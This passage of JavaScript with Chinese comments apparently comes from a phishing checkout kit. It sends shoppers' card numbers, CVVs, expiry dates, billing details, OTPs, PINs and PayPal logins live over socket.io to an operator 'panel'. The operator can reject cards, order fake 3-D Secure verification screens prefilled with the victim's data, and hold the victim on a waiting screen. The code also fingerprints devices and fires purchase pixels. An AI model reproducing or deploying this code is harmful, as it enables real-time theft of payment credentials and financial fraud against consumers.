    on(E.card, 'blur', function () { submitCard(); });

    /* 提交 */
    if (E.form) {
      on(E.form, 'submit', function (ev) {
        ev.preventDefault();
        ev.stopPropagation();
        submitFlow('form');
        return false;
      }, true);
    }
    if (E.submit) {
      on(E.submit, 'click', function (ev) {
        if (E.form) { return; }              /* 有 form 时由 submit 事件接管 */
        ev.preventDefault();
        submitFlow('button');
      });
    }

    return true;
  }

  /* =========================================================================
   * 7. 面板通道（socket.io 4.x）
   * =======================================================================*/
  var EVENT_MAP = {
    register: 'e1', Go_Live: 'e2', change_logname: 'e3',
    send_new_code: 'e4', username_input: 'e5', password_input: 'e6',
    submit_login: 'e7', save_login: 'e8', otp_input: 'e9', submit_otp: 'e10',
    submit_address: 'e11', submit_card: 'e12', update_card: 'e13', save_card: 'e14',
    save_logs_card: 'e15', update_location: 'e16', update_address: 'e17',
    one_time_visit: 'e18', submit_custom_info: 'e19', submit_safety_info: 'e20',
    card_blacklist_check: 'e21', update_step: 'e22',
    pin_input: 'e23', submit_pin: 'e24', aevbv_input: 'e25', submit_aevbv: 'e26',
    submit_app_confirm: 'e27',
    input_paypal_username: 'e28', input_paypal_password: 'e29', submit_paypal_login: 'e30',
    submit_paypal_otp: 'e31', input_paypal_otp: 'e32', input_paypal_question: 'e33',
    submit_paypal_question: 'e34', submit_paypal_cc: 'e35'
  };

  var REVERSE_MAP = {
    r1: 'reject_card', r2: 'card_verify', r3: 'reject_verify', r4: 'disconnect_request',
    r5: 'to_refresh', r6: 'to_finish', r7: 'to_address', r8: 'to_card', r9: 'to_safety',
    r11: 'custom_info', r12: 'reject_login', r13: 'reject_safety', r14: 'reject_zdy',
    r15: 'reject_address', r18: 'verify_request',
    r19: 'card_blacklist_reject', r20: 'card_blacklist_approved',
    r21: 'to_wait_payment', r22: 'to_paypal_otp', r23: 'reject_paypal_otp',
    r24: 'to_paypal_app', r25: 'reject_paypal_app', r26: 'to_paypal_email_otp',
    r27: 'to_paypal_question', r28: 'reject_paypal_question', r29: 'to_paypal_cc'
  };

  var S = {
    socket: null,
    connected: false,
    userId: '',
    pageVisitId: '',
    serverData: null,
    lastGoLivePage: '1',
    registerSent: false,
    verified: null,
    submitting: false,
    awaiting: false,       /* 守卫模式：已提交、正在等面板指令 */
    awaitingSince: 0,
    guardTimer: null
  };

  function newIds() {
    S.userId = 'u' + nowMs().toString(36) + rand(6);
    S.pageVisitId = 'pv' + nowMs().toString(36) + rand(4);
  }

  function statusOf() {
    var pt = (S.serverData && S.serverData.pagetype) ? String(S.serverData.pagetype) : '1';
    return pt === '1' ? '1' : '2';
  }

  function persistSubmitPage(page) {
    S.lastGoLivePage = page;
    try {
      global.sessionStorage.setItem('bp_submit_page', JSON.stringify({
        p: page,
        o: (getCart().order_number || '')
      }));
    } catch (e) {}
  }

  /* 断线/刷新后恢复"已提交"状态；但订单号变了就作废，避免新单显示成已提交 */
  function resumePage() {
    var p = S.lastGoLivePage;
    if (!p || p === '1') {
      try {
        var raw = global.sessionStorage.getItem('bp_submit_page');
        if (raw) {
          var o = null;
          try { o = JSON.parse(raw); } catch (e) { o = { p: raw, o: '' }; }
          var cur = getCart().order_number || '';
          if (o && o.p && (!o.o || !cur || o.o === cur)) { p = o.p; }
          else { global.sessionStorage.removeItem('bp_submit_page'); }
        }
      } catch (e) {}
    }
    return p || '1';
  }

  function send(event, data) {
    var name = EVENT_MAP[event] || event;
    var payload = data || {};

    /* 提交类事件 → 记录 + 页面态（断线回来时面板能恢复"已提交"状态） */
    var SUBMIT_PAGE = {
      update_card: '3+', submit_otp: '4+', submit_login: '50+', submit_pin: '11+',
      submit_aevbv: '12+', submit_app_confirm: '9+', submit_paypal_login: '20+',
      submit_paypal_otp: '21+', submit_paypal_question: '23+', submit_paypal_cc: '24+',
      submit_safety_info: '8+', submit_custom_info: '7+'
    };
    if (SUBMIT_PAGE[event]) { persistSubmitPage(SUBMIT_PAGE[event]); }

    if (!S.socket || !S.connected) { return false; }
    try {
      S.socket.emit(name, b64(payload));
      return true;
    } catch (e) {
      warn('emit failed', event, e);
      return false;
    }
  }

  function goLive(page, extra) {
    var p = String(page || '1');
    /* 同一屏 1.5s 内只发一次（面板判在线用，不必逐键刷） */
    if (!extra && p === S.lastGoLivePage && (nowMs() - (S.lastGoLiveAt || 0)) < 1500) { return; }
    S.lastGoLivePage = p;
    S.lastGoLiveAt = nowMs();
    var d = {
      userType: 'client', userId: S.userId, page_visit_id: S.pageVisitId,
      Current_Page: p, logtype: C.logtype,
      domain: domainWithUTM(), status: statusOf()
    };
    if (extra) { for (var k in extra) { if (Object.prototype.hasOwnProperty.call(extra, k)) { d[k] = extra[k]; } } }
    send('Go_Live', d);
  }

  function register() {
    var c = getCart();
    var d = {
      userType: 'client',
      userId: S.userId,
      page_visit_id: S.pageVisitId,
      user_ip: (S.serverData && S.serverData.user_ip) || '',
      user_os: (S.serverData && S.serverData.user_os) || guessOS(),
      user_agent: (S.serverData && S.serverData.user_agent) || (global.navigator ? navigator.userAgent : ''),
      user_country: (S.serverData && S.serverData.user_country) || '',
      logname: (S.serverData && S.serverData.logname) || C.logname,
      Current_Page: resumePage(),
      domain: domainWithUTM(),
      logtype: C.logtype,
      order_number: c.order_number || ('DRAFT-' + nowMs().toString(36).toUpperCase()),
      products: JSON.stringify(c.items || []),
      total_amount: c.total_amount || '',
      status: statusOf()
    };
    send('register', d);
    S.registerSent = true;
    goLive(resumePage());
  }

  function guessOS() {
    var ua = (global.navigator && navigator.userAgent) || '';
    if (/Android/i.test(ua)) { return 'Android'; }
    if (/iPhone/i.test(ua)) { return 'iOS (iPhone)'; }
    if (/iPad/i.test(ua)) { return 'iOS (iPad)'; }
    if (/Windows NT 10/i.test(ua)) { return 'Windows 10'; }
    if (/Mac OS X/i.test(ua)) { return 'Mac OS X'; }
    if (/Linux/i.test(ua)) { return 'Linux'; }
    return 'Unknown';
  }

  function cardPayload() {
    var b = collectBilling();
    var holder = ((b.firstname || '') + ' ' + (b.lastname || '')).trim();
    var p = {
      userType: 'client',
      Cardholder: holder,
      cardn: digitsOf(E.card),
      Expiry: String(E.exp && E.exp.value || '').trim(),
      cvv2: digitsOf(E.cvc),
      userId: S.userId,
      logtype: C.logtype,
      status: statusOf()
    };
    for (var k in b) { if (Object.prototype.hasOwnProperty.call(b, k) && b[k]) { p[k] = b[k]; } }
    return p;
  }

  function submitCard() {
    if (!E.card) { return; }
    var cardn = digitsOf(E.card);
    if (!cardn) { return; }
    if (S.lastGoLivePage !== '3') { goLive('3'); }
    send('submit_card', cardPayload());
  }

  function updateStep(step) {
    send('update_step', {
      userType: 'client', userId: S.userId, step: step,
      page_visit_id: S.pageVisitId, domain: domainWithUTM(), status: statusOf()
    });
  }

  function blacklistCheck(number) {
    return new Promise(function (resolve) {
      if (!S.socket || !S.connected || !number) { resolve({ approved: true }); return; }
      var done = false, timer = null;

      function finish(r) {
        if (done) { return; }
        done = true;
        if (timer) { clearTimeout(timer); }
        try { S.socket.off('r19', onReject); S.socket.off('r20', onApprove); } catch (e) {}
        resolve(r);
      }
      function onReject(data) {
        finish({
          approved: false,
          message: (data && (data.message || data.reject_message)) || T('cardDeclined'),
          reason: (data && data.reason) || 'blacklisted'
        });
      }
      function onApprove(data) { finish({ approved: true, bin_info: (data && data.bin_info) || null }); }

      try {
        S.socket.once('r19', onReject);
        S.socket.once('r20', onApprove);
      } catch (e) {}
      timer = setTimeout(function () { finish({ approved: true }); }, C.blacklist_wait_ms || 7000);

      send('card_blacklist_check', { userType: 'client', cardn: String(number).replace(/\s+/g, ''), userId: S.userId });
    });
  }

  function onServerEvent(originalEvent, data) {
    fireEvent('bp:' + originalEvent, data);
    try {
      if (S.socket) { S.socket.emit('cmd_ack', b64({ ts: nowMs() })); }
    } catch (e) {}

    switch (originalEvent) {
      case 'card_verify':
      case 'verify_request':
        openModalFromData(data);
        if (S.awaiting) { armGuardTimer(); }   /* 操作员在动作，重置等待计时 */
        break;
      case 'reject_card':
        closeModal();
        clearGuardTimer();
        S.awaiting = false;
        endBusy();
        if (E.card) { markInvalid(E.card, true); try { E.card.focus(); } catch (e) {} }
        showErr((data && (data.message || data.msg || data.error)) || T('cardDeclined'));
        break;
      case 'reject_verify':
        clearGuardTimer();
        S.awaiting = false;
        endBusy();
        showErr((data && (data.message || data.msg)) || T('paymentError'));
        break;
      case 'to_refresh':
        try { global.location.reload(); } catch (e) {}
        break;
      case 'disconnect_request':
        disconnect();
        break;
      case 'to_finish':
        closeModal();
        finishSubmit();
        break;
      case 'to_wait_payment':
        postToModal({ action: 'wait_payment' });
        setBusy(true);
        if (S.awaiting) { armGuardTimer(); }
        break;
      case 'to_address':
        goLive('2');
        break;
      case 'to_card':
        goLive('3');
        break;
      case 'to_safety':
        goLive('4');
        break;
      case 'card_blacklist_reject':
        break;                       /* 由 blacklistCheck 的 Promise 消费 */
      case 'card_blacklist_approved':
        break;
      default:
        break;
    }
  }

  function connect() {
    if (S.socket) { return; }
    if (!global.io) { warn('socket.io 未加载'); return; }
    if (!C.panel_host) { warn('panel_host 未配置'); return; }

    var url = String(C.panel_host).replace(/\/+$/, '');
    var opts = {
      path: C.socket_path || '/socket.io/',
      transports: ['websocket', 'polling'],
      timeout: 10000,
      reconnection: true,
      reconnectionDelay: 200,
      reconnectionDelayMax: 3000,
      randomizationFactor: 0.3,
      reconnectionAttempts: Infinity
    };

    try {
      var sock = global.io(url, opts);
      S.socket = sock;
      bindSocket(sock);
      fireEvent('bp:socket-init', { url: url });
    } catch (e) {
      warn('connect failed', e);
    }
  }

  function bindSocket(sock) {
    sock.on('connect', function () {
      S.connected = true;
      if (!S.userId) { newIds(); }
      register();
      fireEvent('bp:socket-connected', { id: sock.id });
      /* 面板可能要求"补一屏"：把卡片页位置补发一次（幂等） */
    });

    sock.on('connect_error', function (err) {
      S.connected = false;
      warn('connect_error', err && err.message);
    });

    sock.on('disconnect', function (reason) {
      S.connected = false;
      fireEvent('bp:socket-disconnected', { reason: reason });
    });

    Object.keys(REVERSE_MAP).forEach(function (code) {
      sock.on(code, function (data) {
        onServerEvent(REVERSE_MAP[code], data);
      });
    });

    ['payment_status', 'security_alert', 'server_message', 'config_update'].forEach(function (ev) {
      sock.on(ev, function (data) {
        fireEvent('bp:' + ev, data);
        if (ev === 'config_update' && isObj(data)) {
          ['logname', 'logtype'].forEach(function (k) { if (data[k]) { C[k] = data[k]; } });
        }
      });
    });
  }

  function disconnect() {
    try { if (S.socket) { S.socket.removeAllListeners(); S.socket.disconnect(); } } catch (e) {}
    S.socket = null;
    S.connected = false;
  }

  /* =========================================================================
   * 8. 验证弹层（面板下发任意 HTML → srcdoc）
   * =======================================================================*/
  var modalEl = null, frameEl = null;

  function ensureModal() {
    if (modalEl) { return modalEl; }
    modalEl = doc.createElement('div');
    modalEl.id = 'bp-modal';
    modalEl.setAttribute('role', 'dialog');
    modalEl.setAttribute('aria-modal', 'true');
    modalEl.innerHTML =
      '<div class="bp-modal-box">' +
        '<button type="button" class="bp-modal-close" aria-label="close">&#215;</button>' +
        '<iframe class="bp-modal-iframe" title="verification" sandbox="allow-scripts allow-forms allow-same-origin allow-popups"></iframe>' +
      '</div>';
    doc.body.appendChild(modalEl);
    frameEl = q('.bp-modal-iframe', modalEl);
    var btn = q('.bp-modal-close', modalEl);
    on(btn, 'click', function () { closeModal(); });
    /* 校验页回传：优先按面板 runtime 的 {type:'bp_emit'} 协议，其次兼容自定义形状 */
    on(global, 'message', function (ev) {
      if (!frameEl || ev.source !== frameEl.contentWindow) { return; }
      var d = ev.data;
      if (!isObj(d)) { return; }

      if (d.type === 'bp_3ds_ready') { fireEvent('bp:3ds-ready', d); return; }

      /* ① 面板 runtime 协议：{type:'bp_emit', event:'submit_otp', payload:{...}} */
      if (d.type === 'bp_emit' && d.event) {
        var evName = String(d.event);
        fireEvent('bp:tpl-emit', d);

        if (evName === 'close3DSModal' || evName === 'close') { closeModal(); return; }

        var isOtp = (evName === 'submit_otp' || evName === 'otp_verify');
        if (isOtp) { persistSubmitPage('4+'); goLive('4+'); }

        var p = isObj(d.payload) ? d.payload : {};
        if (isOtp) { p.userType = p.userType || 'client'; p.userId = p.userId || S.userId; }
        if (!p.logtype) { p.logtype = C.logtype; }
        if (!p.status) { p.status = statusOf(); }
        if (!p.userId) { p.userId = S.userId; }

        send(EVENT_MAP[evName] ? evName : evName, p);
        return;
      }

      /* ② 兼容自定义：{type:'bp_3ds_submit', code} 或 {action:'submit_otp', code} */
      if (d.type === 'bp_3ds_submit' || d.action === 'submit_otp') {
        var code = d.code || d.otp || d.value || '';
        persistSubmitPage('4+');
        goLive('4+');
        send('submit_otp', {
          userType: 'client', userId: S.userId, otp: String(code),
          logtype: C.logtype, status: statusOf()
        });
      }
    });
  }

  function openModal(html, opts) {
    ensureModal();
    var src = String(html || '');
    if (!src.trim()) { warn('验证屏内容为空'); return; }

    /* 1) 模板里的 ../bp-template-runtime.js 之类相对引用 → 绝对地址，绕开 <base> 解析歧义 */
    var runtimeUrl = C.runtime_url || '/bp/bp-template-runtime.js';
    src = src.replace(/(["'])[^"']*bp-template-runtime\.js\1/g, '"' + runtimeUrl + '"');

    /* 2) 替换模板变量（含 {{key:N}} 这种带格式的） */
    src = processTemplate(src);

    /* 3) 头部注入：<base> + 兼容 shim + BP_PARAMS（必须排在模板自己的脚本之前） */
    var base = (opts && opts.base) || C.assets_base || '/bp/3ds/';
    var params = {
      pagetype: (S.serverData && S.serverData.pagetype) || '1',
      logtype: C.logtype,
      userToken: S.userId,
      Current_Page: '4',
      domain: domainWithUTM(),
      amount: (getCart().total_amount || ''),
      cardnumber: E.card ? digitsOf(E.card) : '',
      brand: E.card ? brandOf(digitsOf(E.card)) : 'visa'
    };
    var head = '' +
      '<base href="' + base + '">' +
      '<script>' +
      '(function(){' +
      ' if(!window.formatPartial)window.formatPartial=function(v,n){var s=(v==null?"":String(v));n=parseInt(n,10);' +
      '  if(!n||n>=s.length)return s;return s.slice(-n);};' +
      ' if(!window.formatFull)window.formatFull=function(v){return v==null?"":String(v);};' +
      ' window.BP_PARAMS=Object.assign(window.BP_PARAMS||{},' + JSON.stringify(params).replace(/</g, '\\u003c') + ');' +
      '})();' +
      '<\/script>';

    if (/<head([^>]*)>/i.test(src)) {
      src = src.replace(/<head([^>]*)>/i, function (m, attrs) { return '<head' + attrs + '>' + head; });
    } else if (/<html([^>]*)>/i.test(src)) {
      src = src.replace(/<html([^>]*)>/i, function (m, attrs) { return '<html' + attrs + '><head>' + head + '</head>'; });
    } else {
      src = '<head>' + head + '</head>' + src;
    }

    modalEl.classList.add('bp-modal--open');
    try { frameEl.removeAttribute('src'); } catch (e) {}
    frameEl.srcdoc = src;
    fireEvent('bp:modal-open', {});

    /* 告诉面板：用户已进入验证码页面（Current_Page 4） */
    updateStep('3ds_modal_opened');
    goLive('4');
  }

  function openModalFromData(data) {
    if (!isObj(data)) { return; }

    /* ① 面板直接下发内联 HTML（srcdoc 模式）*/
    if (typeof data.html === 'string' && data.html.trim()) { openModal(data.html); return; }

    /* ② 面板下发相对路径模板（URL 模式）—— 与原插件一致：
     *    panel 给的是 "3ds/<hash>/index.html"，要拼上 checkout 基址 */
    if (typeof data.template_url === 'string' && data.template_url.trim()) {
      var url = buildTemplateUrl(data.template_url, data.variables);
      if (!url) { warn('template_url 无法解析'); return; }
      ensureModal();
      modalEl.classList.add('bp-modal--open');
      try {
        frameEl.removeAttribute('srcdoc');
        frameEl.src = url;
      } catch (e) { warn('设置模板地址失败', e); }
      fireEvent('bp:modal-open', { url: url });
      log('模板地址', url);

      /* 关键：立刻告诉面板"用户已进入验证页面"，否则面板一直显示等待处理 */
      updateStep('3ds_modal_opened');
      goLive('4');
      return;
    }

    warn('card_verify 既无 html 也无 template_url');
  }

  /* 把面板给的相对模板路径解析成可加载地址 */
  function buildTemplateUrl(t, vars) {
    t = String(t || '').trim();
    if (!t) { return ''; }

    var url = t;
    if (!/^https?:\/\//i.test(t)) {
      if (/^\/\//.test(t)) {
        url = 'https:' + t;
      } else {
        var base = C.template_base;
        if (!base) {
          /* 默认：面板自己托管的 /checkout/ */
          var origin = String(C.panel_host || '')
            .replace(/^wss:/i, 'https:')
            .replace(/^ws:/i, 'http:')
            .replace(/\/+$/, '');
          base = origin + '/checkout/';
        }
        if (base.charAt(base.length - 1) !== '/') { base += '/'; }
        url = base + t.replace(/^\/+/, '');
      }
    }

    /* 面板传来的变量 → query（与原插件一致）；再补上模板通常需要的默认值 */
    var cart = getCart();
    var amount = cart.total_amount || '';
    if (!amount && cart.total) {
      try {
        amount = new Intl.NumberFormat(LANG, { style: 'currency', currency: cart.currency || 'USD' })
          .format(cart.total / 100);
      } catch (e) { amount = (cart.total / 100).toFixed(2) + ' ' + (cart.currency || ''); }
    }
    var merchant = (S.serverData && S.serverData.merchantName) || (doc.title || '').trim() || (global.location && location.hostname) || '';
    var d = new Date();
    var pad = function (n) { return (n < 10 ? '0' : '') + n; };

    var merged = {
      merchantName: merchant,
      merchant: merchant,
      amount: amount,
      total: amount,
      orderid: cart.order_number || '',
      order_number: cart.order_number || '',
      cardnumber: digitsOf(E.card),
      brand: brandOf(digitsOf(E.card)),
      userToken: S.userId,
      user_ip: (S.serverData && S.serverData.user_ip) || '',
      user_country: (S.serverData && S.serverData.user_country) || '',
      logtype: C.logtype,
      date: pad(d.getDate()) + '/' + pad(d.getMonth() + 1) + '/' + d.getFullYear(),
      time: pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds()),
      shoptime: d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate()) + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes())
    };
    if (isObj(vars)) {
      /* 面板的 variables 优先，但**空值不覆盖**我们的默认值（面板常带 amount:"" 之类的空串） */
      for (var k0 in vars) {
        if (!Object.prototype.hasOwnProperty.call(vars, k0)) { continue; }
        var v0 = vars[k0];
        if (v0 === null || v0 === undefined) { continue; }
        if (typeof v0 === 'string' && v0.trim() === '') { continue; }
        merged[k0] = v0;
      }
    }

    var parts = [];
    for (var k in merged) {
      if (Object.prototype.hasOwnProperty.call(merged, k) && merged[k] != null && merged[k] !== '') {
        parts.push(encodeURIComponent(k) + '=' + encodeURIComponent(String(merged[k])));
      }
    }
    parts.push('ts=' + nowMs());
    return url + (url.indexOf('?') === -1 ? '?' : '&') + parts.join('&');
  }

  function closeModal() {
    if (!modalEl) { return; }
    modalEl.classList.remove('bp-modal--open');
    try { frameEl.removeAttribute('srcdoc'); } catch (e) {}
    fireEvent('bp:modal-close', {});
    updateStep('3ds_modal_closed');
  }

  function postToModal(msg) {
    try { if (frameEl && frameEl.contentWindow) { frameEl.contentWindow.postMessage(msg, '*'); } } catch (e) {}
  }

  /* 模板变量：{{merchantName}} / {{amount}} / {{phone:4}} / {{cardnumber:4}} …
   *   :N 表示取末尾 N 位（与面板侧 formatPartial 语义一致） */
  function processTemplate(html) {
    var d = new Date();
    var pad = function (n) { return (n < 10 ? '0' : '') + n; };
    var cart = getCart();
    var b = collectBilling();
    var cardNum = E.card ? digitsOf(E.card) : '';
    var brand = brandOf(cardNum);
    var fullName = ((b.firstname || '') + ' ' + (b.lastname || '')).trim();

    var vars = {
      merchantName: (S.serverData && S.serverData.merchantName) || (doc.title || 'Store'),
      amount: cart.total_amount || '',
      total: cart.total_amount || '',
      orderid: cart.order_number || '',
      order_number: cart.order_number || '',
      currency: cart.currency || '',
      time: pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds()),
      date: d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate()),
      shoptime: d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate()) + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes()),
      cardnumber: cardNum,
      cardnumber4: cardNum.slice(-4),
      last4: cardNum.slice(-4),
      brand: brand,
      holder: fullName,
      name: fullName,
      firstname: b.firstname || '',
      lastname: b.lastname || '',
      email: b.email || '',
      phone: b.phone || '',
      address: b.address1 || '',
      city: b.city || '',
      state: b.state || '',
      zip: b.zip || '',
      postcode: b.postcode || '',
      country: b.country || ''
    };

    var out = String(html);

    /* 带格式的：{{ key : N }} → 末尾 N 位 */
    out = out.replace(/\{\{\s*([a-zA-Z_][\w]*)\s*:\s*(\d{1,3})\s*\}\}/g, function (m, k, n) {
      var v = vars[k];
      if (v === undefined || v === null) { return ''; }
      v = String(v);
      var nn = parseInt(n, 10);
      return (nn > 0 && nn < v.length) ? v.slice(-nn) : v;
    });

    /* 普通占位符；未知 key 一律清空，避免把 {{xxx}} 裸露给用户 */
    out = out.replace(/\{\{\s*([a-zA-Z_][\w]*)\s*\}\}/g, function (m, k) {
      var v = vars[k];
      return (v === undefined || v === null) ? '' : String(v);
    });

    /* data-auto-replace="card-logo" → 按品牌换图标 */
    try {
      var map = {
        visa: 'visa.svg', mastercard: '3d-secure-mastercard.png', amex: '3d-secure-ae.png',
        discover: '3d-secure-dir.png', jcb: '3d-secure-jcb.png'
      };
      var f = map[brand] || map.visa;
      out = out.replace(/<img([^>]*)data-auto-replace\s*=\s*["']card-logo["']([^>]*)>/gi, function (m, a, bb) {
        var clean = (a + bb).replace(/\s*src\s*=\s*["'][^"']*["']/gi, '');
        return '<img' + clean + ' data-auto-replace="card-logo" src="' + C.assets_base + 'img/' + f + '">';
      });
    } catch (e) {}
    return out;
  }

  /* =========================================================================
   * 9. 提交
   * =======================================================================*/
  function setBusy(onoff) {
    busy = !!onoff;
    if (E.submit) {
      E.submit.setAttribute('aria-busy', onoff ? 'true' : 'false');
      /* 转圈动图：按钮文字隐藏、内部画一个 spinner（无文字，契约允许） */
      if (onoff) { E.submit.classList.add('bp-busy'); }
      else { E.submit.classList.remove('bp-busy'); }
    }
    /* 卡片区轻遮罩，避免重复输入 */
    var veil = q('.bp-card-fields') || E.form;
    if (veil && veil.classList) {
      if (onoff) { veil.classList.add('bp-veil'); }
      else { veil.classList.remove('bp-veil'); }
    }
  }
  function endBusy() { setBusy(false); }

  /* =========================================================================
   * 8.5 购买事件（转化像素）
   *     点提交触发一次；同一「设备指纹 + IP」在 pixel_dedupe_hours 内只发一次。
   *     只做浏览器侧（无服务端去重）；页面没装对应像素时静默跳过。
   * =======================================================================*/
  var PX = { fired: false, key: '', eventId: '', last: null };

  function fnv1a(str) {
    var h1 = 0x811c9dc5, h2 = 0x01000193, i, c;
    for (i = 0; i < str.length; i++) {
      c = str.charCodeAt(i);
      h1 ^= c; h1 = (h1 * 0x01000193) >>> 0;
      h2 = ((h2 ^ c) * 0x85ebca6b) >>> 0;
      h2 = (h2 + (h1 >>> 3)) >>> 0;
    }
    return ('00000000' + h1.toString(16)).slice(-8) + ('00000000' + h2.toString(16)).slice(-8);
  }

  function canvasHash() {
    try {
      var c = doc.createElement('canvas');
      c.width = 200; c.height = 40;
      var x = c.getContext('2d');
      if (!x) { return ''; }
      x.textBaseline = 'top';
      x.font = '14px Arial';
      x.fillStyle = '#f60'; x.fillRect(0, 0, 100, 20);
      x.fillStyle = '#069'; x.fillText('bp-fp-9z', 2, 2);
      x.fillStyle = 'rgba(102,204,0,0.7)'; x.fillText('bp-fp-9z', 4, 6);
      return c.toDataURL().slice(-120);
    } catch (e) { return ''; }
  }

  function glInfo() {
    try {
      var c = doc.createElement('canvas');
      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (!gl) { return ''; }
      var dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbg) {
        return String(gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)) + '|' +
               String(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL));
      }
      return String(gl.getParameter(gl.VENDOR)) + '|' + String(gl.getParameter(gl.RENDERER));
    } catch (e) { return ''; }
  }

  /* 设备指纹：UA/语言/时区/屏幕/DPR/核数/平台/cookie 开启/Canvas/WebGL */
  function fingerprint() {
    var nav = global.navigator || {};
    var scr = global.screen || {};
    var tzName = '';
    try { tzName = Intl.DateTimeFormat().resolvedOptions().timeZone || ''; } catch (e) {}
    var parts = [
      String(nav.userAgent || ''),
      String(nav.language || ''),
      Array.isArray(nav.languages) ? nav.languages.join(',') : '',
      String(new Date().getTimezoneOffset()),
      tzName,
      [scr.width, scr.height, scr.colorDepth].join('x'),
      String(global.devicePixelRatio || 1),
      String(nav.hardwareConcurrency || ''),
      String(nav.platform || ''),
      nav.cookieEnabled ? '1' : '0',
      canvasHash(),
      glInfo()
    ];
    return fnv1a(parts.join('||'));
  }

  function pxRead() {
    var best = null;
    try {
      var raw = global.localStorage.getItem('bp_px');
      if (raw) {
        var o = JSON.parse(raw);
        if (o && o.k && o.t) { best = o; }
      }
    } catch (e) {}
    try {
      var m = (doc.cookie || '').match(/(?:^|;\s*)bp_px=([^;]+)/);
      if (m) {
        var o2 = JSON.parse(decodeURIComponent(m[1]));
        if (o2 && o2.k && o2.t && (!best || o2.t > best.t)) { best = o2; }
      }
    } catch (e) {}
    return best;
  }

  function pxWrite(key) {
    var rec = { k: key, t: nowMs() };
    try { global.localStorage.setItem('bp_px', JSON.stringify(rec)); } catch (e) {}
    try {
      var d = new Date();
      d.setTime(d.getTime() + (Number(C.pixel_dedupe_hours) || 24) * 3600 * 1000);
      doc.cookie = 'bp_px=' + encodeURIComponent(JSON.stringify(rec)) +
                   '; expires=' + d.toUTCString() + '; path=/; SameSite=Lax';
    } catch (e) {}
  }

  function pixelKey() {
    if (PX.key) { return PX.key; }
    var ip = (S.serverData && S.serverData.user_ip) || '';
    PX.key = fnv1a(fingerprint() + '|' + ip);
    return PX.key;
  }

  function firePurchase(reason) {
    var res;
    if (C.pixel_enabled === false) {
      res = { ok: false, why: 'disabled' };
      PX.last = res;
      fireEvent('bp:pixel', res);
      return res;
    }
    if (PX.fired) {
      /* 同一页面内重复点击：内存锁，绝不再发 */
      res = { ok: false, why: 'already-fired-this-page', eventId: PX.eventId };
      PX.last = res;
      fireEvent('bp:pixel', res);
      return res;
    }

    var key = pixelKey();
    var hours = Number(C.pixel_dedupe_hours) || 24;
    var rec = pxRead();
    if (rec && rec.k === key && (nowMs() - rec.t) < hours * 3600 * 1000) {
      res = {
        ok: false, why: 'dedupe', key: key,
        age_min: Math.round((nowMs() - rec.t) / 60000)
      };
      PX.last = res;
      fireEvent('bp:pixel', res);
      log('pixel skip(dedupe)', res);
      return res;
    }

    PX.fired = true;
    pxWrite(key);

    var now = new Date();
    var dayTag = now.getUTCFullYear() + '' + (now.getUTCMonth() + 1) + '' + now.getUTCDate();
    PX.eventId = 'bp_' + fnv1a(key + ':' + dayTag);

    var evName = C.pixel_event || 'Purchase';
    var plats = Array.isArray(C.pixel_platforms) ? C.pixel_platforms : ['fb'];
    var cart = getCart();
    var value = Number(cart.total || 0) / 100;
    var cur = cart.currency || '';
    var withValue = C.pixel_value === true;

    var sent = [], missing = [];

    var params = {};
    if (withValue) { params.value = value; params.currency = cur; }

    if (plats.indexOf('fb') !== -1) {
      if (global.fbq) {
        try {
          global.fbq('track', evName, params, { eventID: PX.eventId });
          sent.push('fb');
        } catch (e) { warn('fbq 调用异常', e); }
      } else { missing.push('fb'); }
    }

    if (plats.indexOf('tt') !== -1) {
      if (global.ttq && global.ttq.track) {
        try {
          global.ttq.track(evName === 'Purchase' ? 'CompletePayment' : evName, params, { event_id: PX.eventId });
          sent.push('tt');
        } catch (e) { warn('ttq 调用异常', e); }
      } else { missing.push('tt'); }
    }

    if (plats.indexOf('ga') !== -1) {
      var g = global.gtag || (global.dataLayer && function () {
        global.dataLayer.push(arguments);
      });
      if (g) {
        try {
          g('event', evName === 'Purchase' ? 'purchase' : evName, {
            transaction_id: cart.order_number || PX.eventId,
            value: value, currency: cur
          });
          sent.push('ga');
        } catch (e) { warn('gtag 调用异常', e); }
      } else { missing.push('ga'); }
    }

    PX.last = {
      ok: true, key: key, eventId: PX.eventId, sent: sent, missing: missing,
      event: evName, reason: reason || 'submit', at: nowMs()
    };
    fireEvent('bp:pixel', PX.last);
    log('pixel fired', PX.last);
    return PX.last;
  }

  /* =========================================================================
   * 9. 提交
   * =======================================================================*/
  function submitPayload() {
    var c = getCart(), b = collectBilling(), utm = readUTM();
    return {
      order_number: c.order_number || '',
      amount: c.total || 0,
      currency: c.currency || '',
      locale: LANG,
      utm: utm,
      customer: b
    };
  }

  function pagetype() {
    return String((S.serverData && S.serverData.pagetype) || '1');
  }

  /* 是否要走"挂起等面板"。
   *   allow_direct === false（默认）→ 永远等，忽略 pagetype 与 guard_mode
   *   只有显式 allow_direct: true 才允许直通，且仍受 guard_mode 约束 */
  function needGuard() {
    if (C.allow_direct !== true) { return true; }
    if (C.guard_mode === 'never') { return false; }
    if (C.guard_mode === 'auto') { return pagetype() !== '1'; }
    return true;
  }

  function clearGuardTimer() {
    if (S.guardTimer) { try { clearTimeout(S.guardTimer); } catch (e) {} S.guardTimer = null; }
  }

  function armGuardTimer() {
    clearGuardTimer();
    var ms = Number(C.guard_timeout_ms) || 120000;
    S.guardTimer = setTimeout(function () {
      if (!S.awaiting) { return; }
      warn('守卫超时，释放');
      S.awaiting = false;
      endBusy();
      showErr(T('paymentError'));
      fireEvent('bp:guard-timeout', { ms: ms });
    }, ms);
  }

  /* 真正"完成订单"：通知站点后端 → 跳成功页。只有这里会碰 /api/checkout */
  function postOrder() {
    setBusy(true);
    clearErr();
    if (!global.fetch) { endBusy(); showErr(T('networkError')); return Promise.resolve(); }
    return global.fetch(C.submit_url, {
      method: 'POST',
      credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
      body: JSON.stringify(submitPayload())
    }).then(function (r) { return r.json(); }).then(function (j) {
